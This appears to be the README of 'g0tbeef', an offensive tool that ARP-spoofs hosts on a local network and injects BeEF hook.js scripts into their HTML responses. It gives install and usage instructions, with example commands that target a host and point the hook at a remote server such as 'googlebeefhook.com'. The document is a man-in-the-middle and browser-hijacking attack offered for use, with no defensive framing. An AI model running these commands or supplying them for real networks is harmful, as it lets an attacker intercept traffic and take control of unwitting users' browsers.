g0tbeef
==========

Arp Spoof and inject beef hook in seconds

Installation:
=======

Run 'make install' in the g0tbeef directory. g0tbeef can now be run from anywhere with 'g0tbeef'.

Usage:
=======

	g0tbeef - Inject Beef hooks into html responses via ARP spoofing

	Usage:  g0tbeef <options>

			-t <ip> 	~  ip extension to target
			-r <ip> 	~  full ip address for beef server
			-p <port>	~  port of beef server
			-e          	~  external ip address for beef server

	Examples:
		g0tbeef -t 2								
		  ~  Attack xx.xx.xx.2 beef hook: $MYI:3000/hook.js
		  
		g0tbeef -r googlebeefhook.com -p 80	
		  ~  beef hook: http://googlebeefhook.com:80/hook.js
